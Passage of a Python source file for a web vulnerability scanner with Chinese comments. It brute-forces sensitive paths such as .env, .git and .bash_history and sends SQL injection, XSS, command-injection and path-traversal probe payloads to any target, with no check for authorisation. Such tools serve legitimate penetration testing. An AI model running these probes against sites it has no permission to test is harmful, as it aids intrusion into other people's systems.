#!/usr/bin/env python3
"""
🔍 通用安全扫描器 - 支持任意网站
"""

import requests
import re
import os
import time
import json
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Optional
import logging

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

logger = logging.getLogger(__name__)


class UniversalScanner:
    """通用安全扫描器"""

    # 数据库特有的错误特征（具体短语，避免普通页面含 error/query 就误报）
    SQL_ERROR_PATTERNS = [
        'sql syntax', 'mysql_fetch', 'mysql_num_rows', 'mysql_query',
        'ora-', 'pl/sql', 'postgresql', 'pg_query',
        'unclosed quotation mark', 'quoted string not properly terminated',
        'sqlite3.', 'sqlite_error', 'syntax error at or near',
        'warning: mysql', 'warning: pg_', 'odbc sql server driver',
        'microsoft sql server', 'sqlstate'
    ]

    def __init__(self, config: Dict):
        self.full_config = config
        self.config = config.get('scan', {})
        self.threads = self.config.get('threads', 15)
        self.timeout = self.config.get('timeout', 15)
        self.depth = self.config.get('depth', 'aggressive')

        # 404 基线特征（软404过滤用），目录爆破前校准
        self.not_found_signature = []

        # 速率限制（advanced.rate_limit，每秒请求数；0 表示不限制）
        advanced = config.get('advanced', {}) or {}
        self.rate_limit = advanced.get('rate_limit', 0) or 0
        self._rate_lock = threading.Lock()
        self._last_request_ts = 0.0

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
        })

        # 加载通用字典
        self.wordlists = self.load_universal_wordlists()

        rl = f", 限速 {self.rate_limit}/s" if self.rate_limit else ""
        print(f"🔍 通用扫描器初始化 (线程: {self.threads}, 模式: {self.depth}{rl})")

    def load_universal_wordlists(self) -> Dict[str, List[str]]:
        """加载通用字典"""
        wordlists = {
            'common_paths': [
                # 管理员页面
                '/admin', '/administrator', '/admin.php', '/admin.asp', '/admin.jsp',
                '/admin/', '/administrator/', '/admin123/', '/admin888/',
                '/admincp', '/admincp/', '/admincenter', '/admincenter/',
                '/admin_login', '/admin-login', '/adminlogin',
                '/admin_area', '/admin-area', '/adminarea',
                '/panel', '/panel/', '/controlpanel', '/cp', '/cpanel',
                '/manage', '/manager', '/management', '/system',
                '/console', '/dashboard', '/backoffice',

                # 登录页面
                '/login', '/login.php', '/login.asp', '/login.jsp',
                '/signin', '/signin.php', '/signin.jsp',
                '/auth', '/authentication', '/authenticate',
                '/user', '/user/', '/user/login', '/user/signin',
                '/account', '/account/login', '/account/signin',
                '/member', '/member/login', '/members',
                '/secure', '/secure/login', '/security',

                # API接口
                '/api', '/api/', '/api/v1', '/api/v2', '/api/v3',
                '/rest', '/rest/', '/rest/api', '/rest/v1',
                '/graphql', '/graphql/', '/gql', '/gql/',
                '/soap', '/soap/', '/xmlrpc', '/xmlrpc.php',
                '/json', '/json/', '/json/api', '/jsonrpc',
                '/swagger', '/swagger-ui', '/swagger-ui.html',
                '/openapi', '/openapi.json', '/api-docs', '/docs',
                '/redoc', '/redoc/', '/rapidoc',

                # 配置文件
                '/.env', '/env', '/.env.local', '/.env.production',
                '/config', '/config/', '/config.php', '/config.inc.php',
                '/configuration', '/configuration.php',
                '/settings', '/settings.php', '/settings.py',
                '/application.ini', '/application.properties',
                '/web.config', '/web.xml', '/server.xml',

                # 信息泄露
                '/phpinfo.php', '/phpinfo', '/info.php', '/info',
                '/test.php', '/test', '/debug.php', '/debug',
                '/status', '/status.php', '/server-status',
                '/.git/', '/.git/HEAD', '/.git/config',
                '/.svn/', '/.svn/entries',
                '/.DS_Store', '/.DS_Store/',
                '/.htaccess', '/.htpasswd',
                '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
                '/security.txt', '/.well-known/security.txt',

                # 数据库管理
                '/phpmyadmin', '/phpMyAdmin', '/pma', '/myadmin',
                '/adminer', '/adminer.php', '/adminer-4.7.0.php',
                '/mysql', '/mysql/', '/mysql/admin',
                '/db', '/db/', '/database', '/database/',
                '/dba', '/dba/', '/dbadmin', '/dbadmin/',

                # 备份文件
                '/backup', '/backup/', '/backups', '/backups/',
                '/bak', '/bak/', '/back', '/back/',
                '/old', '/old/', '/temp', '/temp/',
                '/tmp', '/tmp/', '/cache', '/cache/',

                # 上传目录
                '/uploads', '/uploads/', '/upload', '/upload/',
                '/files', '/files/', '/images', '/images/',
                '/assets', '/assets/', '/static', '/static/',
                '/media', '/media/', '/download', '/download/',

                # 其他敏感
                '/.bash_history', '/.bashrc', '/.profile',
                '/ssh', '/ssh/', '/ssh_keys', '/ssh-keys',
                '/secret', '/secret/', '/secrets', '/secrets/',
                '/private', '/private/', '/hidden', '/hidden/',
                '/internal', '/internal/', '/secure_files',
            ],

            'cms_specific': {
                'wordpress': [
                    '/wp-admin', '/wp-login.php', '/wp-content',
                    '/wp-includes', '/wp-config.php', '/wp-json',
                    '/xmlrpc.php', '/wp-signup.php', '/wp-trackback.php'
                ],
                'joomla': [
                    '/administrator', '/administrator/index.php',
                    '/components', '/modules', '/templates',
                    '/libraries', '/plugins', '/media'
                ],
                'drupal': [
                    '/user/login', '/user/register', '/user/password',
                    '/admin', '/admin/config', '/admin/modules',
                    '/sites/all', '/modules', '/themes'
                ],
                'laravel': [
                    '/.env', '/storage', '/bootstrap/cache',
                    '/vendor', '/public/index.php', '/routes'
                ],
                'django': [
                    '/admin', '/admin/login', '/static/admin',
                    '/media', '/accounts/login', '/api'
                ]
            },

            'vulnerability_patterns': [
                # SQL注入测试点
                '?id=1', '?page=1', '?user=1', '?product=1',
                '?category=1', '?news=1', '?article=1',
                '?search=', '?q=', '?query=', '?s=',

                # 文件包含
                '?page=index', '?file=index', '?template=index',
                '?include=index', '?module=index',

                # XSS测试点
                '?name=', '?title=', '?comment=', '?message=',
                '?feedback=', '?review=', '?content=',

                # 命令注入
                '?cmd=', '?command=', '?exec=', '?system=',
                '?ping=', '?host=', '?ip=',

                # 路径遍历
                '?file=../../', '?path=../../', '?folder=../../',
                '?directory=../../', '?doc=../../',
            ]
        }

        # 合并外部字典文件（scan.wordlists.directories 或 wordlists/ 目录）
        external = self._load_external_wordlist()
        if external:
            existing = set(wordlists['common_paths'])
            added = 0
            for p in external:
                if p not in existing:
                    wordlists['common_paths'].append(p)
                    added += 1
            if added:
                print(f"📖 外部字典合并: +{added} 条路径")

        # 根据深度调整字典大小
        if self.depth == 'aggressive':
            # 添加更多路径
            additional_paths = [
                                   f'/admin{i}' for i in range(1, 10)
                               ] + [
                                   f'/login{i}' for i in range(1, 10)
                               ] + [
                                   f'/api{v}' for v in ['', 'v1', 'v2', 'v3', 'v4', 'latest']
                               ]
            wordlists['common_paths'].extend(additional_paths)

        return wordlists

    def _load_external_wordlist(self) -> List[str]:
        """加载外部目录字典（scan.wordlists.directories 或 wordlists/ 下常见文件）"""
        from pathlib import Path
        wl_cfg = (self.full_config.get('scan', {}) or {}).get('wordlists', {}) or {}
        base = Path(__file__).parent

        candidates = []
        if wl_cfg.get('directories'):
            candidates.append(Path(wl_cfg['directories']))
            candidates.append(base / wl_cfg['directories'])
        candidates += [
            base / 'wordlists' / 'directories.txt',
            base / 'wordlists' / 'common.txt',
            base / 'wordlists' / 'dirs.txt',
        ]

        for path in candidates:
            try:
                if path.exists():
                    lines = path.read_text(encoding='utf-8', errors='ignore').splitlines()
                    paths = []
                    for line in lines:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            paths.append(line if line.startswith('/') else '/' + line)
                    if paths:
                        return paths
            except Exception:
                continue
        return []

    def _throttle(self):
        """简单速率限制：保证请求间隔不低于 1/rate_limit 秒"""
        if self.rate_limit <= 0:
            return
        min_interval = 1.0 / self.rate_limit
        with self._rate_lock:
            wait = self._last_request_ts + min_interval - time.time()
            if wait > 0:
                time.sleep(wait)
            self._last_request_ts = time.time()

    def comprehensive_scan(self, target: str, recon_info: Dict) -> Dict:
        """全面安全扫描"""
        print(f"  开始全面扫描: {target}")

        results = {
            'target': target,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': [],
            'sensitive_paths': [],
            'security_issues': [],
            'authentication_points': []
        }

        # 1. 目录爆破
        print("    进行目录爆破...")
        directory_results = self.directory_bruteforce(target, recon_info)
        results['sensitive_paths'] = directory_results

        # 2. 提取注入点（页面表单/链接中的参数）
        injection_points = self.extract_injection_points(target)
        n_params = len(injection_points['get_params'])
        n_forms = len(injection_points['forms'])
        if n_params or n_forms:
            print(f"    提取注入点: {n_params} 个URL参数, {n_forms} 个表单")

        # 3. 漏洞扫描
        print("    扫描常见漏洞...")
        vuln_results = self.vulnerability_scan(target, injection_points)
        results['vulnerabilities'] = vuln_results

        # 4. 安全检查
        print("    执行安全检查...")
        security_results = self.security_checks(target)
        results['security_issues'] = security_results

        # 5. 识别认证点
        print("    识别认证入口...")
        auth_points = self.identify_auth_points(target, directory_results)
        results['authentication_points'] = auth_points

        print(f"    扫描完成！发现 {len(vuln_results)} 漏洞, {len(directory_results)} 敏感路径")

        return results

    def directory_bruteforce(self, target: str, recon_info: Dict) -> List[Dict]:
        """目录爆破"""
        found_paths = []

        # 404 基线校准：先探测随机不存在的路径，建立"未找到"响应特征
        self.calibrate_not_found(target)

        # 选择字典
        paths_to_test = self.wordlists['common_paths'].copy()

        # 根据技术栈添加特定路径
        tech_stack = recon_info.get('tech_stack', [])
        cms_type = recon_info.get('cms')

        if cms_type and cms_type in self.wordlists['cms_specific']:
            paths_to_test.extend(self.wordlists['cms_specific'][cms_type])

        # 从 robots.txt / sitemap.xml 挖掘站长"主动暴露"的路径
        mined = self.mine_disclosed_paths(target)
        if mined:
            existing = set(paths_to_test)
            added = [p for p in mined if p not in existing]
            paths_to_test.extend(added)
            if added:
                print(f"    robots/sitemap 挖掘: +{len(added)} 条路径")

        # 限制测试数量
        if self.depth == 'quick':
            paths_to_test = paths_to_test[:50]
        elif self.depth == 'normal':
            paths_to_test = paths_to_test[:100]
        # aggressive模式使用全部

        print(f"    测试 {len(paths_to_test)} 个路径...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_path = {}

            for path in paths_to_test:
                url = urljoin(target, path)
                future = executor.submit(self.check_url, url)
                future_to_path[future] = (url, path)

            completed = 0
            for future in as_completed(future_to_path):
                completed += 1

                # 显示进度
                if completed % 20 == 0:
                    print(f"    进度: {completed}/{len(paths_to_test)}", end='\r')

                try:
                    result = future.result(timeout=self.timeout)
                    if result and self.is_interesting_result(result):
                        url, path = future_to_path[future]
                        found_paths.append(result)

                        # 实时显示发现
                        if result['status'] != 404:
                            self.print_discovery(result)

                except:
                    pass

            print(f"    进度: {completed}/{len(paths_to_test)} 完成")

        # 递归爆破：对发现的目录再测一轮高频路径（仅 aggressive/full）
        if self.depth in ('aggressive', 'full') and found_paths:
            recursive_results = self.recursive_bruteforce(target, found_paths)
            found_paths.extend(recursive_results)

        # 备份文件探测：对已发现的文件尝试 .bak/.swp/~ 等变体
        if self.depth in ('aggressive', 'full') and found_paths:
            backup_results = self.probe_backup_files(target, found_paths)
            found_paths.extend(backup_results)

        return found_paths

    def recursive_bruteforce(self, target: str, found_paths: List[Dict]) -> List[Dict]:
        """对发现的目录做一层递归爆破（高频路径子集）"""
        # 挑出"是目录"的发现：无文件扩展名且状态码表明存在
        dirs = []
        for info in found_paths:
            path = urlparse(info.get('original_url', info['url'])).path
            name = os.path.basename(path.rstrip('/'))
            if '.' in name:  # 有扩展名 → 文件，跳过
                continue
            if info['status'] in (200, 301, 302, 401, 403):
                dirs.append(path.rstrip('/') + '/')

        dirs = list(dict.fromkeys(dirs))[:5]  # 最多递归 5 个目录，控制请求量
        if not dirs:
            return []

        sub_paths = self.wordlists['common_paths'][:40]  # 高频前 40 条
        candidates = []
        seen = set()
        for d in dirs:
            for p in sub_paths:
                candidate = d + p.lstrip('/')
                if candidate not in seen:
                    seen.add(candidate)
                    candidates.append(candidate)

        print(f"    递归爆破 {len(dirs)} 个目录 × {len(sub_paths)} 条路径...")
        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_map = {
                executor.submit(self.check_url, urljoin(target, c)): c
                for c in candidates
            }
            for future in as_completed(future_map):
                try:
                    result = future.result(timeout=self.timeout)
                except Exception:
                    continue
                if result and self.is_interesting_result(result):
                    self.print_discovery(result)
                    results.append(result)
        return results

    def mine_disclosed_paths(self, target: str) -> List[str]:
        """从 robots.txt 和 sitemap.xml 挖掘路径"""
        paths = set()
        base_netloc = urlparse(target).netloc

        # robots.txt 的 Disallow/Allow 条目
        try:
            resp = self.session.get(urljoin(target, '/robots.txt'),
                                    timeout=self.timeout, verify=False)
            if resp.status_code == 200:
                for line in resp.text.splitlines():
                    m = re.match(r'(?i)^\s*(disallow|allow)\s*:\s*(\S+)', line)
                    if not m:
                        continue
                    parsed = urlparse(urljoin(target, m.group(2)))
                    if parsed.netloc == base_netloc and parsed.path and '*' not in parsed.path:
                        paths.add(parsed.path.rstrip('/') or '/')
        except Exception:
            pass

        # sitemap.xml 的 <loc>（限前200条）
        try:
            resp = self.session.get(urljoin(target, '/sitemap.xml'),
                                    timeout=self.timeout, verify=False)
            if resp.status_code == 200:
                for loc in re.findall(r'<loc>\s*([^<]+?)\s*</loc>', resp.text)[:200]:
                    parsed = urlparse(loc)
                    if parsed.netloc == base_netloc and parsed.path:
                        paths.add(parsed.path.rstrip('/') or '/')
        except Exception:
            pass

        return sorted(paths)[:150]

    def calibrate_not_found(self, target: str):
        """404 基线校准：请求随机不存在的路径，记录"未找到"响应特征"""
        self.not_found_signature = []
        for _ in range(2):
            random_path = f"/yujian_nf_{uuid.uuid4().hex[:12]}"
            try:
                resp = self.session.get(
                    urljoin(target, random_path),
                    timeout=self.timeout, verify=False, allow_redirects=True
                )
                self.not_found_signature.append({
                    'status': resp.status_code,
                    'length': len(resp.content),
                    'title': self.extract_title(resp.text)
                })
            except Exception:
                pass

        if self.not_found_signature and self.not_found_signature[0]['status'] == 200:
            print("    ⚠️ 目标对不存在路径返回 200（软404），已启用基线过滤")

    def matches_not_found(self, result: Dict) -> bool:
        """判断响应是否与 404 基线特征一致（软404/通配路由过滤）"""
        for sig in self.not_found_signature:
            if result['status'] != sig['status']:
                continue
            base_len = sig['length']
            length = result.get('content_length', 0)

            if sig['status'] == 200:
                # 软404：长度接近且标题一致，或与基线完全同长（catch-all 返回同一页面）
                length_close = abs(length - base_len) <= max(100, base_len * 0.05)
                title_same = sig['title'] and result.get('title') == sig['title']
                if (length_close and title_same) or length == base_len:
                    return True
            else:
                # 非 200 的自定义"未找到"响应：长度接近即可
                if abs(length - base_len) <= max(50, base_len * 0.1):
                    return True
        return False

    def probe_backup_files(self, target: str, found_paths: List[Dict]) -> List[Dict]:
        """对已发现的文件探测备份变体（.bak/.swp/~ 等）"""
        backup_exts = ['.bak', '.old', '.swp', '~', '.orig', '.save', '.zip', '.sql', '.txt']
        candidates = []
        seen = set()

        for info in found_paths:
            path = urlparse(info.get('original_url', info['url'])).path
            name = os.path.basename(path)
            if '.' not in name:  # 只对有扩展名的文件探测备份变体
                continue
            for ext in backup_exts:
                variant = path + ext
                if variant not in seen:
                    seen.add(variant)
                    candidates.append(variant)

        candidates = candidates[:120]  # 限制请求量
        if not candidates:
            return []

        print(f"    探测备份文件变体 {len(candidates)} 个...")
        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_map = {
                executor.submit(self.check_url, urljoin(target, p)): p
                for p in candidates
            }
            for future in as_completed(future_map):
                try:
                    result = future.result(timeout=self.timeout)
                except Exception:
                    continue
                if not result or not self.is_interesting_result(result):
                    continue

                # 备份文件通常以纯文本/压缩包形式返回
                ctype = result.get('headers', {}).get('Content-Type', '').lower()
                backup_types = ['text/plain', 'application/zip', 'application/octet-stream',
                                'application/sql', 'application/x-tar']
                result['type'] = 'backup_file'
                result['backup_confidence'] = 'high' if any(t in ctype for t in backup_types) else 'medium'
                self.print_discovery(result)
                results.append(result)

        return results

    def check_url(self, url: str) -> Optional[Dict]:
        """检查URL"""
        self._throttle()
        try:
            response = self.session.get(
                url,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )

            # 提取信息
            page_type = self.classify_page(response.text, url)
            title = self.extract_title(response.text)

            return {
                'url': response.url,
                'original_url': url,
                'status': response.status_code,
                'type': page_type,
                'title': title,
                'content_length': len(response.content),
                'response_time': response.elapsed.total_seconds(),
                'headers': dict(response.headers)
            }

        except Exception as e:
            return {
                'url': url,
                'status': 'error',
                'type': 'error',
                'title': str(e)[:50],
                'content_length': 0,
                'response_time': 0
            }

    def classify_page(self, content: str, url: str) -> str:
        """分类页面类型"""
        content_lower = content.lower()
        url_lower = url.lower()

        # 登录页面
        if any(keyword in content_lower for keyword in ['login', 'sign in', 'password', '用户名', '密码']):
            return 'login_page'

        # 管理后台
        if any(keyword in content_lower for keyword in ['admin', 'dashboard', '控制台', '管理后台']):
            return 'admin_panel'

        # API接口
        if any(keyword in content_lower or keyword in url_lower
               for keyword in ['api', 'json', 'xml', 'rest', 'graphql', 'swagger']):
            return 'api_endpoint'

        # 错误页面
        if any(keyword in content_lower for keyword in ['404', 'not found', 'error', '无法找到']):
            return 'error_page'

        # 配置文件
        if any(keyword in content_lower for keyword in ['config', 'database', 'password', 'secret']):
            return 'config_file'

        # 文件列表
        if any(keyword in content_lower for keyword in ['index of', 'directory listing', '文件列表']):
            return 'directory_listing'

        return 'normal_page'

    def extract_title(self, html: str) -> str:
        """提取标题"""
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1).strip()[:100] if match else ''

    def is_interesting_result(self, result: Dict) -> bool:
        """判断是否是有趣的结果"""
        status = result['status']

        # 跳过404和错误
        if status in [404, 'error']:
            return False

        # 跳过与404基线特征一致的响应（软404/通配路由）
        if self.matches_not_found(result):
            return False

        # 跳过太小的页面（可能只是跳转）
        if result['content_length'] < 100:
            return False

        return True

    def print_discovery(self, result: Dict):
        """打印发现"""
        status = result['status']
        url = result['url']
        page_type = result['type']

        icons = {
            'login_page': '🔐',
            'admin_panel': '⚡',
            'api_endpoint': '🔗',
            'config_file': '⚙️',
            'directory_listing': '📁',
            'error_page': '❌',
            'normal_page': '📄'
        }

        icon = icons.get(page_type, '📄')

        if status == 200:
            status_str = f"✅[{status}]"
        elif status in [301, 302]:
            status_str = f"🔄[{status}]"
        elif status == 403:
            status_str = f"🚫[{status}]"
        elif status == 500:
            status_str = f"💥[{status}]"
        else:
            status_str = f"[{status}]"

        print(f"    {icon} {status_str} {url}")

    @staticmethod
    def merge_params(discovered: List[str], defaults: List[str], limit: int) -> List[str]:
        """发现的参数优先，默认参数补充，去重并限制数量"""
        merged = list(dict.fromkeys(list(discovered or []) + defaults))
        return merged[:limit]

    def extract_injection_points(self, target: str) -> Dict:
        """从首页提取注入点：链接中的GET参数 + 表单结构"""
        points = {'get_params': [], 'forms': []}
        if BeautifulSoup is None:
            return points

        try:
            resp = self.session.get(target, timeout=self.timeout, verify=False)
        except Exception:
            return points

        base_url = resp.url
        base_netloc = urlparse(base_url).netloc
        soup = BeautifulSoup(resp.text, 'html.parser')

        # 1. 从 <a href> 中提取同站链接的查询参数名
        params = set()
        for a in soup.find_all('a', href=True):
            parsed = urlparse(urljoin(base_url, a['href']))
            if parsed.netloc != base_netloc or not parsed.query:
                continue
            for name in parse_qs(parsed.query).keys():
                if name:
                    params.add(name)

        # 2. 提取表单结构
        forms = []
        for form in soup.find_all('form')[:10]:
            action = urljoin(base_url, form.get('action') or base_url)
            method = (form.get('method') or 'get').lower()
            inputs = []
            for field in form.find_all(['input', 'textarea', 'select']):
                name = field.get('name')
                if not name:
                    continue
                inputs.append({
                    'name': name,
                    'type': (field.get('type') or 'text').lower(),
                    'value': field.get('value') or ''
                })
            if inputs:
                forms.append({'action': action, 'method': method, 'inputs': inputs})
            # GET 表单的输入名也是 GET 参数
            if method == 'get':
                for inp in inputs:
                    params.add(inp['name'])

        points['get_params'] = sorted(params)[:15]
        points['forms'] = forms
        return points

    def vulnerability_scan(self, target: str, injection_points: Optional[Dict] = None) -> List[Dict]:
        """漏洞扫描"""
        injection_points = injection_points or {'get_params': [], 'forms': []}
        vulnerabilities = []

        # SQL注入测试（报错型）
        sql_vulns = self.test_sql_injection(target, injection_points)
        vulnerabilities.extend(sql_vulns)

        # SQL注入测试（布尔盲注，响应差异对比，快速）
        bool_vulns = self.test_boolean_based_sqli(target, injection_points)
        vulnerabilities.extend(bool_vulns)

        # SQL注入测试（时间盲注，慢速但可靠）
        blind_vulns = self.test_time_based_sqli(target, injection_points)
        vulnerabilities.extend(blind_vulns)

        # XSS测试
        xss_vulns = self.test_xss(target, injection_points)
        vulnerabilities.extend(xss_vulns)

        # 命令注入测试
        cmd_vulns = self.test_command_injection(target, injection_points)
        vulnerabilities.extend(cmd_vulns)

        # 文件包含测试
        fi_vulns = self.test_file_inclusion(target, injection_points)
        vulnerabilities.extend(fi_vulns)

        # 路径遍历测试
        pt_vulns = self.test_path_traversal(target, injection_points)
        vulnerabilities.extend(pt_vulns)

        # 开放重定向测试
        redirect_vulns = self.test_open_redirect(target, injection_points)
        vulnerabilities.extend(redirect_vulns)

        # 表单测试（GET/POST）
        form_vulns = self.test_post_forms(injection_points)
        vulnerabilities.extend(form_vulns)

        return vulnerabilities

    def test_sql_injection(self, target: str, injection_points: Optional[Dict] = None) -> List[Dict]:
        """SQL注入测试（报错型）"""
        payloads = [
            ("'", "单引号"),
            ("\"", "双引号"),
            ("')", "括号闭合"),
            ("' OR '1'='1", "永真条件"),
            ("1' AND '1'='2", "逻辑测试")
        ]

        vulns = []

        # 先获取基线响应（无 payload），用于排除页面本身含数据库错误的情况
        try:
            baseline_resp = self.session.get(target, timeout=self.timeout, verify=False)
            baseline_content = baseline_resp.text.lower()
            baseline_has_sqlerror = any(p in baseline_content for p in self.SQL_ERROR_PATTERNS)
        except Exception:
            baseline_has_sqlerror = False
            baseline_content = ''

        default_params = ['id', 'page', 'user', 'product', 'category', 'news', 'article']
        test_params = self.merge_params(
            (injection_points or {}).get('get_params'), default_params, 8
        )

        for param in test_params:
            for payload, description in payloads:
                test_url = f"{target}?{param}={payload}"

                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    content = response.text.lower()

                    # 只匹配数据库特有的错误特征
                    matched = [p for p in self.SQL_ERROR_PATTERNS if p in content]
                    if matched:
                        # 若基线本身已含同样的错误特征，则不是 payload 触发，跳过
                        if baseline_has_sqlerror and all(p in baseline_content for p in matched):
                            continue
                        vulns.append({
                            'type': 'sql_injection',
                            'severity': 'high',
                            'url': test_url,
                            'payload': payload,
                            'description': f"SQL注入可能 - {description} (参数: {param})",
                            'evidence': f"发现数据库错误特征: {matched[0]}"
                        })
                        break  # 发现一个就停止测试这个参数

                except Exception:
                    continue

        return vulns

    def test_boolean_based_sqli(self, target: str, injection_points: Optional[Dict] = None) -> List[Dict]:
        """布尔盲注：对比 永真/永假 条件与基线的响应差异"""
        vulns = []
        condition_pairs = [
            ("1' AND '1'='1", "1' AND '1'='2"),
            ("1 AND 1=1", "1 AND 1=2"),
        ]

        default_params = ['id', 'page', 'product', 'category']
        test_params = self.merge_params(
            (injection_points or {}).get('get_params'), default_params, 5
        )

        # 基线响应长度
        try:
            base_resp = self.session.get(target, timeout=self.timeout, verify=False)
            base_len = len(base_resp.content)
        except Exception:
            return vulns

        for param in test_params:
            for true_payload, false_payload in condition_pairs:
                try:
                    t_resp = self.session.get(target, params={param: true_payload},
                                              timeout=self.timeout, verify=False)
                    f_resp = self.session.get(target, params={param: false_payload},
                                              timeout=self.timeout, verify=False)
                except Exception:
                    continue

                t_len = len(t_resp.content)
                f_len = len(f_resp.content)

                # 判定：永真响应 ≈ 基线（查询正常执行），且永真/永假差异显著
                true_close_to_base = abs(t_len - base_len) <= max(100, base_len * 0.05)
                significant_diff = abs(t_len - f_len) > max(100, t_len * 0.1)

                if true_close_to_base and significant_diff:
                    vulns.append({
                        'type': 'sql_injection_boolean_based',
                        'severity': 'high',
                        'url': t_resp.url,
                        'payload': f"{true_payload} / {false_payload}",
                        'description': f"布尔盲注 - 参数 {param} 对真假条件响应不同",
                        'evidence': f"基线 {base_len}B, 永真 {t_len}B, 永假 {f_len}B"
                    })
                    break  # 该参数已确认，换下一个参数

        return vulns

    def test_time_based_sqli(self, target: str, injection_points: Optional[Dict] = None) -> List[Dict]:
        """时间盲注检测：多数据库 SLEEP payload，两次测量 + 同模板短延迟对照"""
        vulns = []
        sleep_sec = 5
        # {s} 为 sleep 秒数；覆盖 MySQL / PostgreSQL / MSSQL
        db_payloads = [
            ('MySQL', "' AND SLEEP({s})-- -"),
            ('PostgreSQL', "';SELECT pg_sleep({s})-- -"),
            ('MSSQL', "'; WAITFOR DELAY '0:0:{s}'-- -"),
        ]

        default_params = ['id', 'page', 'product', 'category']
        test_params = self.merge_params(
            (injection_points or {}).get('get_params'), default_params, 5
        )

        # 基线耗时（两次取最小，抗网络抖动）
        base_times = []
        for _ in range(2):
            try:
                t0 = time.time()
                self.session.get(target, timeout=self.timeout, verify=False)
                base_times.append(time.time() - t0)
            except Exception:
                pass
        if not base_times:
            return vulns
        baseline = min(base_times)

        threshold = baseline + sleep_sec - 1.0  # 允许1秒误差
        req_timeout = max(self.timeout, baseline + sleep_sec + 5)

        def measure(param, payload):
            try:
                t0 = time.time()
                resp = self.session.get(
                    target, params={param: payload},
                    timeout=req_timeout, verify=False
                )
                return time.time() - t0, resp
            except Exception:
                return None, None

        for param in test_params:
            for db_type, tpl in db_payloads:
                payload = tpl.format(s=sleep_sec)

                # 同一 payload 测两次，排除偶发抖动
                elapsed_list = []
                resp = None
                for _ in range(2):
                    e, resp = measure(param, payload)
                    if e is None:
                        break
                    elapsed_list.append(e)
                if len(elapsed_list) < 2 or not all(e >= threshold for e in elapsed_list):
                    continue

                # 对照组：同模板 1 秒版本应快速返回，排除目标本身就慢
                control_elapsed, _ = measure(param, tpl.format(s=1))
                if control_elapsed is None or control_elapsed >= threshold:
                    continue

                vulns.append({
                    'type': 'sql_injection_time_based',
                    'severity': 'high',
                    'url': resp.url if resp is not None else target,
                    'payload': payload,
                    'description': f"时间盲注({db_type}) - 参数 {param} 可控制响应延迟",
                    'evidence': (f"基线 {baseline:.2f}s, 注入后 "
                                 f"{elapsed_list[0]:.2f}s/{elapsed_list[1]:.2f}s, "
                                 f"对照 {control_elapsed:.2f}s")
                })
                break  # 该参数已确认，换下一个参数

        return vulns

    def test_xss(self, target: str, injection_points: Optional[Dict] = None) -> List[Dict]:
        """XSS测试"""
        payloads = [
            ("<script>alert('XSS')</script>", "基础XSS"),
            ("<img src=x onerror=alert(1)>", "图片XSS"),
            ("\" onmouseover=\"alert(1)", "事件处理器XSS"),
            ("<svg onload=alert(1)>", "SVG XSS"),
            ("javascript:alert(1)", "JavaScript协议")
        ]

        vulns = []
        default_params = ['q', 'search', 'name', 'comment', 'message']
        test_params = self.merge_params(
            (injection_points or {}).get('get_params'), default_params, 6
        )

        for param in test_params:
            for payload, description in payloads[:3]:
                test_url = f"{target}?{param}={payload}"

                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)

                    # 只在 HTML 响应中检测反射型 XSS，排除 JSON API 原样回显导致的误报
                    content_type = response.headers.get('Content-Type', '').lower()
                    if 'json' in content_type or 'javascript' in content_type:
                        continue

                    # 检查payload是否被反射到HTML中
                    if payload in response.text:
                        vulns.append({
                            'type': 'xss',
                            'severity': 'medium',
                            'url': test_url,
                            'payload': payload,
                            'description': f"反射型XSS可能 - {description}",
                            'evidence': '输入被反射到HTML响应中'
                        })
                        break

                except:
                    continue

        return vulns

    def test_command_injection(self, target: str, injection_points: Optional[Dict] = None) -> List[Dict]:
        """命令注入测试"""
        # 命令执行后常见的输出特征（用于确认真正执行了系统命令）
        cmd_output_patterns = [
            r'total\s+\d+',              # ls -l 输出开头
            r'uid=\d+\(',                # id 命令输出
            r'root:.*:.*:.*:.*:',        # /etc/passwd 行格式
            r'volume in drive',          # Windows dir 输出
            r'directory of\s',           # Windows dir 输出
            r'\[boot loader\]',          # boot.ini
            r'profiles\.ini',            # Windows 系统文件
            r'bytes free',               # dir 输出结尾
            r'pid\s+\d+\s+',            # ps 输出
            r'drwx[rwxts-]+\s',          # ls -l 权限位
        ]

        payloads = [
            (";ls", "分号执行"),
            ("| ls", "管道执行"),
            ("&& ls", "与执行"),
            ("|| ls", "或执行"),
            ("`ls`", "反引号执行")
        ]

        vulns = []
        default_params = ['cmd', 'command', 'exec', 'ping', 'host']
        test_params = self.merge_params(
            (injection_points or {}).get('get_params'), default_params, 8
        )

        # 获取基线响应（无 payload），用于差异对比
        try:
            baseline_resp = self.session.get(target, timeout=self.timeout, verify=False)
            baseline_len = len(baseline_resp.content)
            baseline_text = baseline_resp.text
        except Exception:
            baseline_len = 0
            baseline_text = ''

        for param in test_params:
            for payload, description in payloads:
                test_url = f"{target}?{param}={payload}"

                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    content = response.text

                    # 判定需要同时满足两个条件：
                    # 1. 响应与基线有明显差异（不是普通的正常页面）
                    length_diff = abs(len(response.content) - baseline_len)
                    significant_diff = (
                        baseline_len > 0 and length_diff > baseline_len * 0.2
                    ) or (baseline_text != content and length_diff > 50)

                    # 2. 响应中出现命令执行的典型输出特征
                    has_cmd_output = any(
                        re.search(p, content, re.IGNORECASE) for p in cmd_output_patterns
                    )

                    if has_cmd_output and significant_diff:
                        vulns.append({
                            'type': 'command_injection',
                            'severity': 'high',
                            'url': test_url,
                            'payload': payload,
